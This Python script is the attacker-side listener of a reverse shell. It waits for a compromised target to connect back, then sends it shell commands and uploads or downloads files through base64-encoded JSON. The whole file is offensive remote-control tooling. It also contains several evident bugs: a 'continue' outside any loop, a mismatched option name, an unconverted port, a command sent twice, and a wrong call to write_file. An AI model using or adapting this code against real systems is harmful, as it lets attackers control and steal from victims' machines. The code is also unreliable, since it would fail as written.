#! /usr/bin/python
"""A simple listener script.
   Uses Python 3.8"""

import optparse
import base64
import socket
import shlex
import json


def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = optparse.OptionParser()
    # arguments
    parser.add_option('-l', '--local', dest='local_io', help='Attacking host IP.')
    parser.add_option('-p', '--port', dest='port', help='Port to connect to.')

    (options, arguments) = parser.parse_args()

    return options


options = get_arguments()


class Listener:
    def __init__(self, local_ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((local_ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connections...')
        self.connection, address = listener.accept()
        print(f'[+] Connection from {str(address)}.')


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())


    def reliable_receive(self):
        json_data = b''
        try:
            json_data += self.connection.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue


    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()     # closes connection
            exit()                      # exits script

        self.reliable_send(command)     # sends command to target
        return self.reliable_receive()


    def write_file(self, path, contents):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(contents))          # re-encodes characters
            return '[+] Download successful...'


    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())        # encodes unknown characters to known characters


    def run(self):
        while True:
            command = input('>> ')
            command = command.split(' ')

            # try:
            if command[0] == 'upload':
                file_content = self.read_file(command[1])
                command.append(file_content)

            result = self.execute_remotely(command)

            if command[0] == 'download' and '[-] Error' not in result:
                result = self.write_file(result)
            # except Exception:
            #     result = '[-] Error during command execution.'

            print(result)


my_listener = Listener(options.local_ip, options.port)
my_listener.run()

print(f'Got a connection from: {options.local_ip}:{options.port}')